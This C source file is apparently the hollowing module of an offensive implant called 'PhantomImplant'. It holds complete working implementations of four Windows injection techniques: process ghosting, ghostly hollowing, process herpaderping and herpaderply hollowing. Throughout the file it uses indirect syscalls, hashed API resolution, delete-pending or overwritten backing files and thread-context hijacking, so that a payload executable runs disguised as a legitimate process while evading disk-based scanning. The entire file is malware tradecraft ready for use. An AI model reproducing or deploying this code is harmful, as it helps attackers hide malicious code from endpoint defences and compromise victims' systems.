/**
 * PhantomImplant - PE Hollowing Module
 *
 * Four image-based injection techniques:
 *   1. Ghost Process Injection   - delete-pending section + NtCreateProcessEx
 *   2. Ghostly Hollowing         - ghost section mapped into suspended process
 *   3. Process Herpaderping      - section from overwritten file, disk cleanup
 *   4. Herpaderply Hollowing     - herpaderp section mapped + thread hijack
 *
 * These operate on a full PE image (not position-independent shellcode).
 */

#include "hollowing.h"
#include "syscalls.h"
#include "api.h"
#include <stdio.h>

extern NTAPI_FUNC g_Nt;

// ------------------------------------------------------------------
// Native constants not exposed by mingw's winternl.h
// ------------------------------------------------------------------
#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE            0x00000040
#endif
#ifndef FILE_SUPERSEDE
#define FILE_SUPERSEDE                  0x00000000
#endif
#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT    0x00000020
#endif
#ifndef SEC_IMAGE
#define SEC_IMAGE                       0x01000000
#endif
#ifndef SECTION_ALL_ACCESS
#define SECTION_ALL_ACCESS              0x000F001F
#endif

#define FileDispositionInformation          13
#define ProcessBasicInformation             0
#define RTL_USER_PROC_PARAMS_NORMALIZED     0x00000001
#define PROCESS_CREATE_FLAGS_INHERIT_HANDLES 0x00000004
#define ViewShare                          1
#define ViewUnmap                          2
#define NtCurrentProcess()                 ((HANDLE)(LONG_PTR)-1)

// ------------------------------------------------------------------
// Minimal full-layout structures (mingw's winternl.h only exposes
// partial definitions, so these use distinct names).
// ------------------------------------------------------------------
typedef struct _RTL_USER_PROCESS_PARAMETERS_FULL {
    ULONG           MaximumLength;              // 0x00
    ULONG           Length;                     // 0x04
    ULONG           Flags;                      // 0x08
    ULONG           DebugFlags;                 // 0x0C
    PVOID           ConsoleHandle;              // 0x10
    ULONG           ConsoleFlags;               // 0x18
    ULONG           Padding0;                   // 0x1C
    PVOID           StandardInput;              // 0x20
    PVOID           StandardOutput;             // 0x28
    PVOID           StandardError;              // 0x30
    BYTE            CurrentDirectory[0x18];     // 0x38 (CURDIR)
    UNICODE_STRING  DllPath;                    // 0x50
    UNICODE_STRING  ImagePathName;              // 0x60
    UNICODE_STRING  CommandLine;                // 0x70
    PVOID           Environment;                // 0x80
} RTL_USER_PROCESS_PARAMETERS_FULL, *PRTL_USER_PROCESS_PARAMETERS_FULL;

typedef struct _PEB_HOLLOW {
    BYTE   InheritedAddressSpace;               // 0x00
    BYTE   ReadImageFileExecOptions;            // 0x01
    BYTE   BeingDebugged;                       // 0x02
    BYTE   BitField;                            // 0x03
    DWORD  Padding0;                            // 0x04
    PVOID  Mutant;                              // 0x08
    PVOID  ImageBaseAddress;                    // 0x10
    PVOID  Ldr;                                 // 0x18
    PVOID  ProcessParameters;                   // 0x20
    PVOID  SubSystemData;                       // 0x28
    PVOID  ProcessHeap;                         // 0x30
} PEB_HOLLOW, *PPEB_HOLLOW;

typedef NTSTATUS (NTAPI* fnRtlCreateProcessParametersEx)(
    PRTL_USER_PROCESS_PARAMETERS_FULL* pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

// ------------------------------------------------------------------
// Helpers
// ------------------------------------------------------------------
static fnRtlCreateProcessParametersEx ResolveRtlCreateProcessParametersEx(VOID) {
    static fnRtlCreateProcessParametersEx pFn = NULL;
    if (!pFn) {
        HMODULE hNtdll = GetModuleHandleH(NTDLL_DLL_HASH);
        if (hNtdll)
            pFn = (fnRtlCreateProcessParametersEx)GetProcAddressH(hNtdll, RtlCreateProcessParametersEx_HASH);
    }
    return pFn;
}

static DWORD FetchEntryPointRva(IN PBYTE pFileBuffer) {
    if (!pFileBuffer)
        return 0;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pFileBuffer + ((PIMAGE_DOS_HEADER)pFileBuffer)->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE)
        return 0;
    return pNt->OptionalHeader.AddressOfEntryPoint;
}

static LPWSTR DupWideStr(IN LPCWSTR src) {
    if (!src)
        return NULL;
    int len = lstrlenW(src);
    LPWSTR dst = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (len + 1) * sizeof(WCHAR));
    if (dst)
        lstrcpyW(dst, src);
    return dst;
}

static BOOL GenerateTempFile(OUT LPWSTR szPath, IN DWORD cch) {
    WCHAR szDir[MAX_PATH] = {0};
    WCHAR szFile[MAX_PATH] = {0};
    if (!GetTempPathW(MAX_PATH, szDir))
        return FALSE;
    if (!GetTempFileNameW(szDir, L"PH", 0, szFile))
        return FALSE;
    if (cch < (DWORD)lstrlenW(szFile) + 1)
        return FALSE;
    lstrcpyW(szPath, szFile);
    return TRUE;
}

static SIZE_T GetEnvironmentBlockSize(IN PVOID pEnv) {
    if (!pEnv)
        return 0;
    PWCHAR p = (PWCHAR)pEnv;
    SIZE_T n = 0;
    while (!(p[n] == 0 && p[n + 1] == 0))
        n++;
    return (n + 2) * sizeof(WCHAR);
}

static void InitUnicodeString(OUT PUNICODE_STRING us, IN LPWSTR buf) {
    SIZE_T len = buf ? (SIZE_T)lstrlenW(buf) * sizeof(WCHAR) : 0;
    us->Length        = (USHORT)(len & 0x7FFF);
    us->MaximumLength = (USHORT)(len + sizeof(WCHAR) > 0x7FFF ? 0x7FFF : len + sizeof(WCHAR));
    us->Buffer        = buf;
}

// ------------------------------------------------------------------
// Ghost section: open temp file, mark delete-on-close, write payload,
// create an SEC_IMAGE section from the still-open handle, close (delete).
// ------------------------------------------------------------------
static BOOL CreateGhostSection(IN LPWSTR szNtFilePath, IN PBYTE pPeBuffer, IN DWORD dwPeSize, OUT PHANDLE phSection) {
    HANDLE              hFile     = NULL;
    HANDLE              hSection  = NULL;
    NTSTATUS            status    = 0;
    UNICODE_STRING      uName     = {0};
    OBJECT_ATTRIBUTES   oa        = {0};
    IO_STATUS_BLOCK     iosb      = {0};
    FILE_DISPOSITION_INFORMATION fdi = {0};
    LARGE_INTEGER       offset    = {0};

    *phSection = NULL;

    InitUnicodeString(&uName, szNtFilePath);
    oa.Length              = sizeof(oa);
    oa.RootDirectory       = NULL;
    oa.ObjectName          = &uName;
    oa.Attributes          = OBJ_CASE_INSENSITIVE;
    oa.SecurityDescriptor  = NULL;
    oa.SecurityQualityOfService = NULL;

    SET_SYSCALL(g_Nt.NtOpenFile);
    status = RunSyscall(&hFile, DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
                        &oa, &iosb, FILE_SHARE_READ | FILE_SHARE_WRITE,
                        FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT);
    if (status != 0 || !hFile)
        goto _fail;

    fdi.DoDeleteFile = TRUE;
    SET_SYSCALL(g_Nt.NtSetInformationFile);
    status = RunSyscall(hFile, &iosb, &fdi, sizeof(fdi), FileDispositionInformation);
    if (status != 0)
        goto _fail;

    SET_SYSCALL(g_Nt.NtWriteFile);
    status = RunSyscall(hFile, NULL, NULL, NULL, &iosb, pPeBuffer, dwPeSize, &offset, NULL);
    if (status != 0)
        goto _fail;

    SET_SYSCALL(g_Nt.NtCreateSection);
    status = RunSyscall(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
    if (status != 0 || !hSection)
        goto _fail;

    *phSection = hSection;
    SET_SYSCALL(g_Nt.NtClose);
    RunSyscall(hFile);   // delete-on-close removes the temp file from disk
    return TRUE;

_fail:
    if (hFile)   { SET_SYSCALL(g_Nt.NtClose); RunSyscall(hFile); }
    if (hSection){ SET_SYSCALL(g_Nt.NtClose); RunSyscall(hSection); }
    return FALSE;
}

// ------------------------------------------------------------------
// Manually build and write RTL_USER_PROCESS_PARAMETERS + environment
// into the remote process, and point PEB->ProcessParameters at it.
// ------------------------------------------------------------------
static BOOL InitializeProcessParams(IN HANDLE hProcess, IN LPWSTR szImagePath, OUT PVOID* ppImageBase) {
    fnRtlCreateProcessParametersEx pRtlCreate = ResolveRtlCreateProcessParametersEx();
    if (!pRtlCreate)
        return FALSE;

    NTSTATUS                    status       = 0;
    PRTL_USER_PROCESS_PARAMETERS_FULL pParams  = NULL;
    PVOID                       pEnv         = NULL;
    LPWSTR                      szCwd        = NULL;
    LPWSTR                      szImageOnly  = NULL;
    UNICODE_STRING              usImagePath  = {0};
    UNICODE_STRING              usCurrentDir = {0};
    UNICODE_STRING              usCommandLine= {0};
    PROCESS_BASIC_INFORMATION   pbi          = {0};
    PEB_HOLLOW                  peb          = {0};
    ULONG_PTR                   base         = 0;
    ULONG_PTR                   end          = 0;
    SIZE_T                      span         = 0;
    SIZE_T                      written      = 0;
    PVOID                       pTmp         = NULL;
    BOOL                        bOk          = FALSE;

    *ppImageBase = NULL;

    szCwd = DupWideStr(szImagePath);
    if (!szCwd)
        return FALSE;
    {
        LPWSTR p = wcsrchr(szCwd, L'\\');
        if (p) *p = L'\0';
    }

    szImageOnly = DupWideStr(szImagePath);
    if (!szImageOnly)
        goto _done;
    {
        LPWSTR p = wcsstr(szImageOnly, L".exe");
        if (p) *(p + 4) = L'\0';
    }

    pEnv = (PVOID)GetEnvironmentStringsW();
    if (!pEnv)
        goto _done;

    InitUnicodeString(&usCommandLine, szImagePath);
    InitUnicodeString(&usCurrentDir, szCwd);
    InitUnicodeString(&usImagePath, szImageOnly);

    status = pRtlCreate(&pParams, &usImagePath, NULL, &usCurrentDir, &usCommandLine,
                        pEnv, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
    FreeEnvironmentStringsW((LPWCH)pEnv);
    pEnv = NULL;
    if (status != 0 || !pParams)
        goto _done;

    SET_SYSCALL(g_Nt.NtQueryInformationProcess);
    status = RunSyscall(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
    if (status != 0 || !pbi.PebBaseAddress)
        goto _done;

    SET_SYSCALL(g_Nt.NtReadVirtualMemory);
    status = RunSyscall(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL);
    if (status != 0)
        goto _done;

    *ppImageBase = peb.ImageBaseAddress;

    // Params + environment share one contiguous numeric span (same addresses
    // in local and remote, so internal pointers stay valid after the write).
    base = (ULONG_PTR)pParams;
    end  = base + pParams->Length;
    if (pParams->Environment) {
        if ((ULONG_PTR)pParams->Environment < base)
            base = (ULONG_PTR)pParams->Environment;
        ULONG_PTR envEnd = (ULONG_PTR)pParams->Environment + GetEnvironmentBlockSize(pParams->Environment);
        if (envEnd > end)
            end = envEnd;
    }
    span = end - base;

    pTmp = (PVOID)base;
    SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
    status = RunSyscall(hProcess, &pTmp, (ULONG_PTR)0, &span, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0)
        goto _done;

    SET_SYSCALL(g_Nt.NtWriteVirtualMemory);
    status = RunSyscall(hProcess, pParams, pParams, (SIZE_T)pParams->Length, &written);
    if (status != 0)
        goto _done;

    if (pParams->Environment) {
        SIZE_T envSize = GetEnvironmentBlockSize(pParams->Environment);
        SET_SYSCALL(g_Nt.NtWriteVirtualMemory);
        status = RunSyscall(hProcess, pParams->Environment, pParams->Environment, envSize, &written);
        if (status != 0)
            goto _done;
    }

    {
        PVOID pRemoteProcessParams = (PVOID)((ULONG_PTR)pbi.PebBaseAddress + offsetof(PEB_HOLLOW, ProcessParameters));
        SET_SYSCALL(g_Nt.NtWriteVirtualMemory);
        status = RunSyscall(hProcess, pRemoteProcessParams, &pParams, sizeof(PVOID), &written);
        if (status != 0)
            goto _done;
    }

    bOk = TRUE;

_done:
    // NOTE: pParams + pParams->Environment are allocated by ntdll via
    // RtlCreateProcessParametersEx. We intentionally leak them here —
    // freeing them manually (HeapFree) is unsafe because the environment
    // block is not a plain process-heap allocation in all builds. The
    // injection is operator-triggered and one-shot, so a few KB leak is
    // acceptable and far safer than a heap-corruption crash.
    if (szCwd)       HeapFree(GetProcessHeap(), 0, szCwd);
    if (szImageOnly) HeapFree(GetProcessHeap(), 0, szImageOnly);
    return bOk;
}

// ------------------------------------------------------------------
// Hijack a suspended thread: point RCX at the entry point and patch
// PEB.ImageBaseAddress to the mapped image.
// ------------------------------------------------------------------
static BOOL HijackRemoteProcess(IN HANDLE hProcess, IN HANDLE hThread, IN PVOID pRemoteBase, IN DWORD rva) {
    NTSTATUS status = 0;
    CONTEXT  ctx    = {0};
    PVOID    pEntry = (PVOID)((ULONG_PTR)pRemoteBase + rva);

    ctx.ContextFlags = CONTEXT_FULL;

    SET_SYSCALL(g_Nt.NtGetContextThread);
    status = RunSyscall(hThread, &ctx);
    if (status != 0)
        return FALSE;

    ctx.Rcx = (DWORD64)pEntry;
    PVOID pRemoteImageBase = (PVOID)((ULONG_PTR)ctx.Rdx + offsetof(PEB_HOLLOW, ImageBaseAddress));

    SET_SYSCALL(g_Nt.NtSetContextThread);
    status = RunSyscall(hThread, &ctx);
    if (status != 0)
        return FALSE;

    SET_SYSCALL(g_Nt.NtWriteVirtualMemory);
    status = RunSyscall(hProcess, pRemoteImageBase, &pRemoteBase, sizeof(ULONG_PTR), NULL);
    if (status != 0)
        return FALSE;

    return TRUE;
}

// ------------------------------------------------------------------
// Disk write helpers for herpaderping / herpaderply
// ------------------------------------------------------------------
static BOOL OverwriteFile(IN HANDLE hDst, IN PBYTE pBuf, IN DWORD dwSize) {
    DWORD written = 0;
    if (SetFilePointer(hDst, 0, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
        return FALSE;
    if (!WriteFile(hDst, pBuf, dwSize, &written, NULL) || written != dwSize)
        return FALSE;
    if (!FlushFileBuffers(hDst))
        return FALSE;
    if (!SetEndOfFile(hDst))
        return FALSE;
    return TRUE;
}

static BOOL OverwriteFileFromFile(IN HANDLE hSrc, IN HANDLE hDst) {
    DWORD size = GetFileSize(hSrc, NULL);
    if (size == INVALID_FILE_SIZE || size == 0)
        return FALSE;
    PBYTE buf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, size);
    if (!buf)
        return FALSE;
    DWORD read = 0;
    if (SetFilePointer(hSrc, 0, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
        HeapFree(GetProcessHeap(), 0, buf);
        return FALSE;
    }
    if (!ReadFile(hSrc, buf, size, &read, NULL) || read != size) {
        HeapFree(GetProcessHeap(), 0, buf);
        return FALSE;
    }
    BOOL ok = OverwriteFile(hDst, buf, size);
    HeapFree(GetProcessHeap(), 0, buf);
    return ok;
}

// ------------------------------------------------------------------
// Isolated NtCreateThreadEx indirect syscall. All 64-bit parameters are
// cast explicitly — through the variadic RunSyscall trampoline, a bare int
// literal leaves the upper 32 bits undefined, which the kernel reads as a
// garbage StackSize/ZeroBits and intermittently fails with STATUS_NO_MEMORY.
// ------------------------------------------------------------------
static NTSTATUS SyscallCreateThread(IN HANDLE* phThread, IN HANDLE hProcess, IN PVOID pEntry) {
    SET_SYSCALL(g_Nt.NtCreateThreadEx);
    return RunSyscall(
        phThread,
        (ACCESS_MASK)THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        pEntry,
        NULL,
        (ULONG)FALSE,
        (SIZE_T)0,      // ZeroBits
        (SIZE_T)0,      // StackSize
        (SIZE_T)0,      // MaximumStackSize
        NULL
    );
}

// ==================================================================
// 1. Ghost Process Injection
// ==================================================================
BOOL GhostProcessInject(IN PBYTE pPeBuffer, IN DWORD dwPeSize, IN LPWSTR szLegitImage) {
    HANDLE  hSection = NULL;
    HANDLE  hProcess = NULL;
    HANDLE  hThread  = NULL;
    WCHAR   szTmpPath[MAX_PATH]   = {0};
    WCHAR   szNtPath[MAX_PATH * 2] = {0};
    PVOID   pImageBase = NULL;
    PVOID   pEntry     = NULL;
    DWORD   rva        = 0;
    NTSTATUS status    = 0;

    if (!pPeBuffer || !dwPeSize || !szLegitImage)
        return FALSE;

    if (!GenerateTempFile(szTmpPath, MAX_PATH))
        return FALSE;
    lstrcpyW(szNtPath, L"\\??\\");
    lstrcatW(szNtPath, szTmpPath);

    if (!CreateGhostSection(szNtPath, pPeBuffer, dwPeSize, &hSection))
        return FALSE;

    SET_SYSCALL(g_Nt.NtCreateProcessEx);
    status = RunSyscall(&hProcess, PROCESS_ALL_ACCESS, NULL, NtCurrentProcess(),
                        PROCESS_CREATE_FLAGS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
    if (status != 0 || !hProcess)
        goto _fail;

    if (hSection) { SET_SYSCALL(g_Nt.NtClose); RunSyscall(hSection); hSection = NULL; }

    if (!InitializeProcessParams(hProcess, szLegitImage, &pImageBase) || !pImageBase)
        goto _fail;

    rva = FetchEntryPointRva(pPeBuffer);
    if (!rva)
        goto _fail;
    pEntry = (PVOID)((ULONG_PTR)pImageBase + rva);

    status = SyscallCreateThread(&hThread, hProcess, pEntry);
    if (status != 0 || !hThread)
        goto _fail;

    if (hThread) { SET_SYSCALL(g_Nt.NtClose); RunSyscall(hThread); }
    if (hProcess){ SET_SYSCALL(g_Nt.NtClose); RunSyscall(hProcess); }
    return TRUE;

_fail:
    if (hThread)  { SET_SYSCALL(g_Nt.NtClose); RunSyscall(hThread); }
    if (hProcess) { SET_SYSCALL(g_Nt.NtClose); RunSyscall(hProcess); }
    if (hSection) { SET_SYSCALL(g_Nt.NtClose); RunSyscall(hSection); }
    return FALSE;
}

// ==================================================================
// 2. Ghostly Hollowing
// ==================================================================
BOOL GhostlyHollow(IN PBYTE pPeBuffer, IN DWORD dwPeSize, IN LPWSTR szLegitImage) {
    HANDLE              hSection  = NULL;
    WCHAR               szTmpPath[MAX_PATH]   = {0};
    WCHAR               szNtPath[MAX_PATH * 2] = {0};
    STARTUPINFOW        si        = {0};
    PROCESS_INFORMATION pi        = {0};
    PVOID               pBase     = NULL;
    SIZE_T              viewSize  = 0;
    DWORD               rva       = 0;
    NTSTATUS            status    = 0;
    LPWSTR              szCwd     = NULL;
    BOOL                bOk       = FALSE;

    if (!pPeBuffer || !dwPeSize || !szLegitImage)
        return FALSE;

    si.cb = sizeof(si);

    if (!GenerateTempFile(szTmpPath, MAX_PATH))
        return FALSE;
    lstrcpyW(szNtPath, L"\\??\\");
    lstrcatW(szNtPath, szTmpPath);

    if (!CreateGhostSection(szNtPath, pPeBuffer, dwPeSize, &hSection))
        return FALSE;

    szCwd = DupWideStr(szLegitImage);
    if (!szCwd)
        goto _done;
    {
        LPWSTR p = wcsrchr(szCwd, L'\\');
        if (p) *p = L'\0';
    }

    if (!CreateProcessW(NULL, szLegitImage, NULL, NULL, TRUE,
                        CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, szCwd, &si, &pi))
        goto _done;

    SET_SYSCALL(g_Nt.NtMapViewOfSection);
    status = RunSyscall(hSection, pi.hProcess, &pBase, (ULONG_PTR)0, (SIZE_T)0, NULL, &viewSize,
                        ViewUnmap, 0, PAGE_READONLY);
    if (status != 0 || !pBase)
        goto _done;

    rva = FetchEntryPointRva(pPeBuffer);
    if (!rva)
        goto _done;

    if (!HijackRemoteProcess(pi.hProcess, pi.hThread, pBase, rva))
        goto _done;

    SET_SYSCALL(g_Nt.NtResumeThread);
    RunSyscall(pi.hThread, NULL);

    bOk = TRUE;

_done:
    if (szCwd) HeapFree(GetProcessHeap(), 0, szCwd);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread)  CloseHandle(pi.hThread);
    if (hSection)   { SET_SYSCALL(g_Nt.NtClose); RunSyscall(hSection); }
    if (!bOk && pi.hProcess) TerminateProcess(pi.hProcess, 0);
    return bOk;
}

// ==================================================================
// 3. Process Herpaderping
// ==================================================================
BOOL HerpaderpingProcess(IN PBYTE pPeBuffer, IN DWORD dwPeSize, IN LPWSTR szLegitImage) {
    HANDLE    hTmpFile    = INVALID_HANDLE_VALUE;
    HANDLE    hLegitFile  = INVALID_HANDLE_VALUE;
    HANDLE    hSection    = NULL;
    HANDLE    hProcess    = NULL;
    HANDLE    hThread     = NULL;
    WCHAR     szTmpPath[MAX_PATH] = {0};
    DWORD     share       = FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE;
    DWORD     rva         = 0;
    PVOID     pImageBase  = NULL;
    PVOID     pEntry      = NULL;
    NTSTATUS  status      = 0;
    LPWSTR    szLegitOnly = NULL;

    if (!pPeBuffer || !dwPeSize || !szLegitImage)
        return FALSE;

    if (!GenerateTempFile(szTmpPath, MAX_PATH))
        return FALSE;

    szLegitOnly = DupWideStr(szLegitImage);
    if (!szLegitOnly)
        return FALSE;
    {
        LPWSTR p = wcsstr(szLegitOnly, L".exe");
        if (p) *(p + 4) = L'\0';
    }

    hTmpFile = CreateFileW(szTmpPath, GENERIC_READ | GENERIC_WRITE, share,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hTmpFile == INVALID_HANDLE_VALUE)
        goto _done;

    hLegitFile = CreateFileW(szLegitOnly, GENERIC_READ, share,
                             NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hLegitFile == INVALID_HANDLE_VALUE)
        goto _done;

    if (!OverwriteFile(hTmpFile, pPeBuffer, dwPeSize))
        goto _done;

    SET_SYSCALL(g_Nt.NtCreateSection);
    status = RunSyscall(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hTmpFile);
    if (status != 0 || !hSection)
        goto _done;

    SET_SYSCALL(g_Nt.NtCreateProcessEx);
    status = RunSyscall(&hProcess, PROCESS_ALL_ACCESS, NULL, NtCurrentProcess(),
                        PROCESS_CREATE_FLAGS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
    if (status != 0 || !hProcess)
        goto _done;

    if (hSection) { SET_SYSCALL(g_Nt.NtClose); RunSyscall(hSection); hSection = NULL; }

    // Replace the on-disk temp file with the legit image before execution.
    if (!OverwriteFileFromFile(hLegitFile, hTmpFile))
        goto _done;

    CloseHandle(hTmpFile);   hTmpFile   = INVALID_HANDLE_VALUE;
    CloseHandle(hLegitFile); hLegitFile = INVALID_HANDLE_VALUE;

    if (!InitializeProcessParams(hProcess, szTmpPath, &pImageBase) || !pImageBase)
        goto _done;

    rva = FetchEntryPointRva(pPeBuffer);
    if (!rva)
        goto _done;
    pEntry = (PVOID)((ULONG_PTR)pImageBase + rva);

    status = SyscallCreateThread(&hThread, hProcess, pEntry);
    if (status != 0 || !hThread)
        goto _done;

    if (hThread) { SET_SYSCALL(g_Nt.NtClose); RunSyscall(hThread); }
    if (hProcess){ SET_SYSCALL(g_Nt.NtClose); RunSyscall(hProcess); }
    if (szLegitOnly) HeapFree(GetProcessHeap(), 0, szLegitOnly);
    return TRUE;

_done:
    if (hThread)    { SET_SYSCALL(g_Nt.NtClose); RunSyscall(hThread); }
    if (hProcess)   { SET_SYSCALL(g_Nt.NtClose); RunSyscall(hProcess); }
    if (hSection)   { SET_SYSCALL(g_Nt.NtClose); RunSyscall(hSection); }
    if (hTmpFile   != INVALID_HANDLE_VALUE) CloseHandle(hTmpFile);
    if (hLegitFile != INVALID_HANDLE_VALUE) CloseHandle(hLegitFile);
    if (szLegitOnly) HeapFree(GetProcessHeap(), 0, szLegitOnly);
    return FALSE;
}

// ==================================================================
// 4. Herpaderply Hollowing
// ==================================================================
BOOL HerpaderplyHollow(IN PBYTE pPeBuffer, IN DWORD dwPeSize, IN LPWSTR szLegitImage) {
    HANDLE              hTmpFile    = INVALID_HANDLE_VALUE;
    HANDLE              hLegitFile  = INVALID_HANDLE_VALUE;
    HANDLE              hSection    = NULL;
    WCHAR               szTmpPath[MAX_PATH] = {0};
    STARTUPINFOW        si          = {0};
    PROCESS_INFORMATION pi          = {0};
    DWORD               share       = FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE;
    DWORD               rva         = 0;
    PVOID               pBase       = NULL;
    SIZE_T              viewSize    = 0;
    NTSTATUS            status      = 0;
    LPWSTR              szLegitOnly = NULL;
    LPWSTR              szCwd       = NULL;
    BOOL                bOk         = FALSE;

    if (!pPeBuffer || !dwPeSize || !szLegitImage)
        return FALSE;

    si.cb = sizeof(si);

    if (!GenerateTempFile(szTmpPath, MAX_PATH))
        return FALSE;

    szLegitOnly = DupWideStr(szLegitImage);
    if (!szLegitOnly)
        return FALSE;
    {
        LPWSTR p = wcsstr(szLegitOnly, L".exe");
        if (p) *(p + 4) = L'\0';
    }

    szCwd = DupWideStr(szLegitOnly);
    if (!szCwd)
        goto _done;
    {
        LPWSTR p = wcsrchr(szCwd, L'\\');
        if (p) *p = L'\0';
    }

    hTmpFile = CreateFileW(szTmpPath, GENERIC_READ | GENERIC_WRITE, share,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hTmpFile == INVALID_HANDLE_VALUE)
        goto _done;

    hLegitFile = CreateFileW(szLegitOnly, GENERIC_READ, share,
                             NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hLegitFile == INVALID_HANDLE_VALUE)
        goto _done;

    if (!OverwriteFile(hTmpFile, pPeBuffer, dwPeSize))
        goto _done;

    SET_SYSCALL(g_Nt.NtCreateSection);
    status = RunSyscall(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hTmpFile);
    if (status != 0 || !hSection)
        goto _done;

    if (!CreateProcessW(NULL, szLegitImage, NULL, NULL, TRUE,
                        CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, szCwd, &si, &pi))
        goto _done;

    SET_SYSCALL(g_Nt.NtMapViewOfSection);
    status = RunSyscall(hSection, pi.hProcess, &pBase, (ULONG_PTR)0, (SIZE_T)0, NULL, &viewSize,
                        ViewShare, 0, PAGE_READONLY);
    if (status != 0 || !pBase)
        goto _done;

    if (hSection) { SET_SYSCALL(g_Nt.NtClose); RunSyscall(hSection); hSection = NULL; }

    if (!OverwriteFileFromFile(hLegitFile, hTmpFile))
        goto _done;

    CloseHandle(hTmpFile);   hTmpFile   = INVALID_HANDLE_VALUE;
    CloseHandle(hLegitFile); hLegitFile = INVALID_HANDLE_VALUE;

    rva = FetchEntryPointRva(pPeBuffer);
    if (!rva)
        goto _done;

    if (!HijackRemoteProcess(pi.hProcess, pi.hThread, pBase, rva))
        goto _done;

    SET_SYSCALL(g_Nt.NtResumeThread);
    RunSyscall(pi.hThread, NULL);

    bOk = TRUE;

_done:
    if (szLegitOnly) HeapFree(GetProcessHeap(), 0, szLegitOnly);
    if (szCwd)       HeapFree(GetProcessHeap(), 0, szCwd);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread)  CloseHandle(pi.hThread);
    if (hSection)   { SET_SYSCALL(g_Nt.NtClose); RunSyscall(hSection); }
    if (hTmpFile   != INVALID_HANDLE_VALUE) CloseHandle(hTmpFile);
    if (hLegitFile != INVALID_HANDLE_VALUE) CloseHandle(hLegitFile);
    if (!bOk && pi.hProcess) TerminateProcess(pi.hProcess, 0);
    return bOk;
}
